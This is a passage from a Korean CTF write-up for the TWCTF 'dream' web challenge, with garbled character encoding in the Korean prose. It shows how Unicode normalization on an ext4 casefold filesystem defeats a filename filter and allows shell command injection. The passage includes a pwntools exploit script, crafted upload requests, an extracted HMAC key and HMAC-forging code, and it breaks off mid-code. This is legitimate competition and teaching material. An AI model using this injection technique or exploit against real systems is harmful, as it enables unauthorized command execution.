        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".cs"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".config"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".dll"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".php"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".phtml"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".shtml"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".cgi"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>$ARGV[0]ì— ë“¤ì–´ê°€ëŠ” ì¸ì ê°’ì€ ìµœì¢…ì ìœ¼ë¡œ compressFile í•¨ìˆ˜ì˜ <code class="highlighter-rouge">filename</code>ìœ¼ë¡œ ë“¤ì–´ê°€ê²Œ ë©ë‹ˆë‹¤. í•˜ì§€ë§Œ upload.aspx.cs ì½”ë“œì— ìˆëŠ” <code class="highlighter-rouge">Exists()</code> í•¨ìˆ˜ë¡œ ì¸í•´ì„œ íŒŒì¼ëª…ì— <code class="highlighter-rouge">ë‚˜ .. ê°™ì€ íŠ¹ìˆ˜ë¬¸ìë¥¼ ì…ë ¥í•  ìˆ˜ ì—†ì—ˆìŠµë‹ˆë‹¤. ë˜í•œ </code>SecurityCheck` í•¨ìˆ˜ë¡œ ì¸í•´ ì›¹ì‰˜ ì—…ë¡œë“œë„ ë¶ˆê°€ëŠ¥í•´ ë³´ì˜€ì£ .</p>

<p>í•˜ì§€ë§Œ ext4 casefold íŒŒì¼ì‹œìŠ¤í…œì€ casefold ë¿ ë§Œ ì•„ë‹ˆë¼ normalize ëœ íŒŒì¼ëª…ì„ ê¸°ì¤€ìœ¼ë¡œ íŒŒì¼ëª…ì„ ë¹„êµí•œë‹¤ê³  ë§ì”€ë“œë ¸ì—ˆëŠ”ë°ìš”. ì´ëŠ” ext4 casefoldê°€ ê³µì‹ì ìœ¼ë¡œ Unicode Normalizationì„ ì§€ì›í•œë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ê°„ë‹¨í•˜ê²Œ ë§í•´ì„œ NFDì˜ <code class="highlighter-rouge">A\u030a</code>ì™€ NFCì˜ <code class="highlighter-rouge">\u00c5</code> ë¥¼ ë™ë“±(equivalent) í•˜ê²Œ ë³´ê² ë‹¤ëŠ” ëœ»ì´ ë©ë‹ˆë‹¤.</p>

<p><img src="/assets/2010js11.png" alt="/assets/2010js11.png" /></p>

<p><img src="/assets/2010js12.png" alt="/assets/2010js12.png" /></p>

<p>ë§ˆì°¬ê°€ì§€ë¡œ asciiì— ë§¤í•‘ë˜ëŠ” unicode ì¼€ì´ìŠ¤ë¥¼ ì¢€ ë” ì¡°ì‚¬í•˜ê¸° ì‹œì‘í–ˆê³ , ucdì˜ <code class="highlighter-rouge">NormalizationTest</code> ì—ì„œ shell commandë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆì„ë§Œí•œ ëª‡ ê°€ì§€ í¥ë¯¸ë¡œìš´ ì¼€ì´ìŠ¤ë“¤ì„ ì°¾ì„ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p>

<p><a href="https://www.unicode.org/Public/12.1.0/ucd/NormalizationTest.txt"></a></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>037E;003B;003B;003B;003B; # (Í¾; ;; ;; ;; ;; ) GREEK QUESTION MARK
1FEF;0060;0060;0060;0060; # (á¿¯; `; `; `; `; ) GREEK VARIA
226E;226E;003C 0338;226E;003C 0338; # (â‰®; â‰®; &lt;â—ŒÌ¸; â‰®; &lt;â—ŒÌ¸; ) NOT LESS-THAN
226F;226F;003E 0338;226F;003E 0338; # (â‰¯; â‰¯; &gt;â—ŒÌ¸; â‰¯; &gt;â—ŒÌ¸; ) NOT GREATER-THAN
</code></pre></div></div>

<p>ìœ„ì—ì„œë¶€í„° ì°¨ë¡€ëŒ€ë¡œ ;, `, &lt;, &gt; ì´ ë„¤ ê°€ì§€ ì…ë‹ˆë‹¤. ì„¸ë¯¸ì½œë¡ ì„ ê¸°ì¤€ìœ¼ë¡œ NFC; NFD; NFKC; NFKD ìˆœì„œì´ë©° ìœ„ì™€ ë§ˆì°¬ê°€ì§€ë¡œ normalize ì´í›„ <code class="highlighter-rouge">\u226e</code>ì™€ <code class="highlighter-rouge">&lt;\u0338</code> ëŠ” ë™ë“±í•´ì§ˆ ê²ƒì…ë‹ˆë‹¤. ğŸ˜‰</p>

<p><img src="/assets/2010js13.png" alt="/assets/2010js13.png" /></p>

<p>ì´ì œ ê±°ì˜ ë‹¤ ì™”ìŠµë‹ˆë‹¤!</p>

<h2 id="exploit">Exploit</h2>

<p>ì €í¬ëŠ” ;, `, &lt;, &gt;  ì´ë ‡ê²Œ ì´ 4ê°€ì§€ ì‰˜ ì»¤ë§¨ë“œë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ 4 ê°€ì§€ ì‰˜ ì»¤ë§¨ë“œë¡œ ì–´ë–»ê²Œ ì‰˜ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆì„ ì§€ ëª‡ ê°€ì§€ í…ŒìŠ¤íŠ¸ë¥¼ í•´ë´¤ëŠ”ë°ìš”. ìµœì¢…ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œë¥¼ í†µí•´ ì‰˜ ëª…ë ¹ì–´ ì‹¤í–‰ì´ ê°€ëŠ¥í–ˆìŠµë‹ˆë‹¤.</p>

<p><img src="/assets/2010js14.png" alt="/assets/2010js14.png" /></p>

<p>ë¨¼ì € aì— ì‹¤í–‰ì‹œí‚¤ê³  ì‹¶ì€ ì‰˜ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•œ ë‹¤ìŒ, shì— ë¦¬ë‹¤ì´ë ‰ì…˜ ê¸°í˜¸ë¥¼ í†µí•´ aë¥¼ ì…ë ¥ìœ¼ë¡œ ì£¼ê³ , ê·¸ ë‹¤ìŒ ë‚˜ì˜¨ ì•„ì›ƒí’‹ì„ bë¡œ ì£¼ê²Œ ë˜ë©´ ëª…ë ¹ì–´ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>

<p>ë”°ë¼ì„œ Exploit ì‹œë‚˜ë¦¬ì˜¤ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p>

<ol>
  <li>ì‹¤í–‰í•  ëª…ë ¹ì–´ë¥¼ ë‹´ì€ íŒŒì¼ì„ ë§Œë“¤ê³  <code class="highlighter-rouge">\u0338a</code> ì´ë¼ëŠ” ì´ë¦„ìœ¼ë¡œ ì—…ë¡œë“œ</li>
  <li><code class="highlighter-rouge">\u1FEFsh\u226Ea\u226Fb\u1FEF</code> ë¼ëŠ” dummy íŒŒì¼ ì—…ë¡œë“œ</li>
  <li><code class="highlighter-rouge">sh&lt;\u0338a&gt;\u0338b</code> ì••ì¶•</li>
</ol>

<p><img src="/assets/2010js15.png" alt="/assets/2010js15.png" /></p>

<p>íŒŒì¼ëª…ì„ <code class="highlighter-rouge">\u1FEFsh\u226Ea\u226Fb\u1FEF</code> ë¡œ ì—…ë¡œë“œí•˜ê²Œ ë˜ë©´, unicode normalizationë¡œ ì¸í•´ <code class="highlighter-rouge">sh&lt;\u0338a&gt;\u0338b</code> ë„ ë™ë“±í•˜ê²Œ ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë˜ì–´, ì••ì¶•í•  ë•Œ <code class="highlighter-rouge">sh&lt;\u0338a&gt;\u0338b</code> íŒŒì¼ì„ ì¸ìë¡œ ì£¼ê²Œë˜ë©´ ìµœì¢…ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ perl ìŠ¤í¬ë¦½íŠ¸ê°€ ì™„ì„±ë©ë‹ˆë‹¤.</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">zip</span> <span class="p">"</span><span class="s2">`sh&lt;</span><span class="err">\</span><span class="s2">u0338a&gt;</span><span class="err">\</span><span class="s2">u0338b`.zip</span><span class="p">"</span> <span class="p">"</span><span class="s2">`sh&lt;</span><span class="err">\</span><span class="s2">u0338a&gt;</span><span class="err">\</span><span class="s2">u0338b`</span><span class="p">"</span>
</code></pre></div></div>

<p>í•˜ì§€ë§Œ ì••ì¶•ëœ íŒŒì¼ëª…ì„ ì¡°ì‘í•˜ê¸° ìœ„í•´ì„œëŠ” hmac keyê°€ í•„ìš”í•œë°, ë‹¤í–‰íˆ 1ë²ˆ ì·¨ì•½ì ì„ í†µí•´ ì†ì‰½ê²Œ hmac keyë¥¼ ì¶”ì¶œí•´ë‚¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p>

<blockquote>
  <blockquote>
    <p>hmac : <code class="highlighter-rouge">5af42f71a1b864b7d2093336013508f8</code></p>
  </blockquote>
</blockquote>

<p>ê·¸ ì´í›„, 1ë²ˆ ì·¨ì•½ì ìœ¼ë¡œ ì–»ì€ hmacì„ í†µí•´ ì›í•˜ëŠ” íŒŒì¼ ëª…ì„ file-decompressorì˜ $ARGV[0] ì— ì¤„ ìˆ˜ ìˆì—ˆê³ , ë”°ë¼ì„œ command injection ì·¨ì•½ì ì„ ë°œí˜„ì‹œí‚¬ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p>

<p>ë‹¤ìŒì€ Exploit ì½”ë“œì…ë‹ˆë‹¤.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'dream.chal.ctf.westerns.tokyo'</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">u'''POST /upload.aspx HTTP/1.1
Host: dream.chal.ctf.westerns.tokyo
Connection: keep-alive
Content-Length: 1700
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dream.chal.ctf.westerns.tokyo
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZiSaf9FJ6PtAeIM5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dream.chal.ctf.westerns.tokyo/upload.aspx
Accept-Encoding: gzip, deflate
Accept-Language: ko,en-US;q=0.9,en;q=0.8,ko-KR;q=0.7
Cookie: ASP.NET_SessionId=AEDE0033A82E6358B8C052CA

------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="__VIEWSTATE"

/wEMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMwDjJWVIJvIW8qNp8fjXqX3h5GVcJ5o5Yra9F5KfHb
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="file1"; filename="test"
Content-Type: application/octet-stream

/get_flag2
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="filename1"

{}
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="button1"

Upload
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="uploadedFilename"

------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="uploadedFilenameTag"

xvvJTvo9RYTqWsgJMNLZLiEwoJ4eF5uR/hCW+FgYp6Y=
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEdAAEAAAD/////AQAAAAAAAAAPAQAAAAUAAAAIyd/IalikKYp4o/TJEB6bjEPD+b8LAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOTyO0VpwYzoHI+eXiWfAGvnzmaoGBHm77uPr8qGQH1E
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5--'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">filename</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="s">' '</span><span class="o">*</span><span class="mi">100</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    
<span class="k">def</span> <span class="nf">compress</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">tag</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'dream.chal.ctf.westerns.tokyo'</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">u'''POST /upload.aspx HTTP/1.1
Host: dream.chal.ctf.westerns.tokyo
Connection: keep-alive
Content-Length: 1730
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dream.chal.ctf.westerns.tokyo
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycTTUhLx8GPsIrRrB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dream.chal.ctf.westerns.tokyo/upload.aspx
Accept-Encoding: gzip, deflate
Accept-Language: ko,en-US;q=0.9,en;q=0.8,ko-KR;q=0.7
Cookie: ASP.NET_SessionId=AEDE0033A82E6358B8C052CA

------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="__VIEWSTATE"

/wEMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMwDjJWVIJvIW8qNp8fjXqX3h5GVcJ5o5Yra9F5KfHb
------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="file1"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="filename1"

test
------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="uploadedFilename"

{filename}
------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="uploadedFilenameTag"

{tag}
------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="button2"

Compress
------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEdAAEAAAD/////AQAAAAAAAAAPAQAAAAUAAAAIyd/IalikKYp4o/TJEB6bjEPD+b8LAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOTyO0VpwYzoHI+eXiWfAGvnzmaoGBHm77uPr8qGQH1E
------WebKitFormBoundarycTTUhLx8GPsIrRrB--'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="n">filename</span><span class="p">,</span> <span class="n">tag</span><span class="o">=</span><span class="n">tag</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="s">' '</span><span class="o">*</span><span class="mi">100</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">upload</span><span class="p">(</span><span class="s">"</span><span class="se">\u0338</span><span class="s">a"</span><span class="p">)</span>
<span class="n">upload</span><span class="p">(</span><span class="s">"</span><span class="se">\u1FEF</span><span class="s">sh</span><span class="se">\u226E</span><span class="s">a</span><span class="se">\u226F</span><span class="s">b</span><span class="se">\u1FEF</span><span class="s">"</span><span class="p">)</span>
<span class="n">compress</span><span class="p">(</span><span class="s">"`sh&lt;</span><span class="se">\u0338</span><span class="s">a&gt;</span><span class="se">\u0338</span><span class="s">b`"</span><span class="p">,</span> <span class="s">"u15vKcAnJTc0p2SSfYLqs7XQzuSZfIj+uikBQ2S7lmc="</span><span class="p">)</span>
</code></pre></div></div>

<p>FLAG : <code class="highlighter-rouge">TWCTF{c0e7d10abe93c98ec4c3025b498cd383_ext4_casefold+web_server=vuln!}</code></p>

<h3 id="appendix-1---hmac-êµ¬í•˜ëŠ”-ì½”ë“œ">Appendix #1 - hmac êµ¬í•˜ëŠ” ì½”ë“œ</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">using</span> <span class="n">System</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Configuration</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Collections</span><span class="p">.</span><span class="n">Generic</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Linq</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">RegularExpressions</span><span class="p">;</span>

<span class="n">namespace</span> <span class="n">Rextester</span>
<span class="p">{</span>

    <span class="n">public</span> <span class="k">class</span> <span class="nc">Program</span>
    <span class="p">{</span>
        <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">Main</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
			<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"</span><span class="se">\u1FEF</span><span class="s">sh&lt;</span><span class="se">\u0338</span><span class="s">a&gt;</span><span class="se">\u0338</span><span class="s">b</span><span class="se">\u1FEF</span><span class="s">"</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">GenerateHmac</span><span class="p">(</span><span class="s">"</span><span class="se">\u1FEF</span><span class="s">sh&lt;</span><span class="se">\u0338</span><span class="s">a&gt;</span><span class="se">\u0338</span><span class="s">b</span><span class="se">\u1FEF</span><span class="s">"</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="n">private</span> <span class="n">static</span> <span class="n">string</span> <span class="n">keyEncryptionKeyHex</span> <span class="o">=</span>
            <span class="s">"aabad0f0a8fefae3eb8b032ab0c99627"</span><span class="p">;</span>

        <span class="n">private</span> <span class="n">static</span> <span class="nb">int</span> <span class="n">HexdigitToInteger</span><span class="p">(</span><span class="n">char</span> <span class="n">c</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="s">'0'</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'9'</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">c</span> <span class="o">-</span> <span class="s">'0'</span><span class="p">;</span>
            <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="s">'a'</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'f'</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">c</span> <span class="o">-</span> <span class="s">'a'</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
            <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="s">'A'</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'F'</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">c</span> <span class="o">-</span> <span class="s">'A'</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
            <span class="k">else</span>
                <span class="n">throw</span> <span class="n">new</span> <span class="n">ArgumentException</span><span class="p">(</span><span class="s">"Invalid hex"</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">private</span> <span class="n">static</span> <span class="n">char</span> <span class="n">IntegerToHexdigit</span><span class="p">(</span><span class="nb">int</span> <span class="n">x</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">x</span> <span class="o">&gt;=</span> <span class="mi">16</span><span class="p">)</span>
                <span class="n">throw</span> <span class="n">new</span> <span class="n">ArgumentException</span><span class="p">(</span><span class="s">"Out of range"</span><span class="p">);</span>
            <span class="k">else</span>
                <span class="k">return</span> <span class="s">"0123456789abcdef"</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
        <span class="p">}</span>

        <span class="n">private</span> <span class="n">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">HexToBytes</span><span class="p">(</span><span class="n">string</span> <span class="nb">hex</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">hex</span><span class="p">.</span><span class="n">Length</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">throw</span> <span class="n">new</span> <span class="n">ArgumentException</span><span class="p">(</span><span class="s">"Invalid hex"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">byte</span><span class="p">[]</span> <span class="n">result</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="nb">hex</span><span class="p">.</span><span class="n">Length</span> <span class="o">/</span> <span class="mi">2</span><span class="p">];</span>
            <span class="k">for</span> <span class="p">(</span><span class="nb">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">result</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)((</span><span class="n">HexdigitToInteger</span><span class="p">(</span><span class="nb">hex</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">2</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">|</span>
                                <span class="n">HexdigitToInteger</span><span class="p">(</span><span class="nb">hex</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]));</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">private</span> <span class="n">static</span> <span class="n">string</span> <span class="n">BytesToHex</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">data</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">var</span> <span class="n">result</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
            <span class="n">foreach</span> <span class="p">(</span><span class="n">var</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">result</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">IntegerToHexdigit</span><span class="p">(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">));</span>
                <span class="n">result</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">IntegerToHexdigit</span><span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">));</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">result</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="n">protected</span> <span class="n">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">DecryptKey</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">encryptedKey</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">var</span> <span class="n">keyEncryptionKey</span> <span class="o">=</span> <span class="n">HexToBytes</span><span class="p">(</span><span class="n">keyEncryptionKeyHex</span><span class="p">);</span>
            <span class="n">using</span> <span class="p">(</span><span class="n">var</span> <span class="n">aes</span> <span class="o">=</span> <span class="n">new</span> <span class="n">AesManaged</span><span class="p">())</span> <span class="p">{</span>
                <span class="n">aes</span><span class="p">.</span><span class="n">BlockSize</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
                <span class="n">aes</span><span class="p">.</span><span class="n">KeySize</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
                <span class="n">aes</span><span class="p">.</span><span class="n">Mode</span> <span class="o">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">ECB</span><span class="p">;</span>
                <span class="n">aes</span><span class="p">.</span><span class="n">Padding</span> <span class="o">=</span> <span class="n">PaddingMode</span><span class="p">.</span><span class="bp">None</span><span class="p">;</span>
                <span class="n">aes</span><span class="p">.</span><span class="n">Key</span> <span class="o">=</span> <span class="n">keyEncryptionKey</span><span class="p">;</span>
                <span class="n">using</span> <span class="p">(</span><span class="n">var</span> <span class="n">decryptor</span> <span class="o">=</span> <span class="n">aes</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">())</span> <span class="p">{</span>
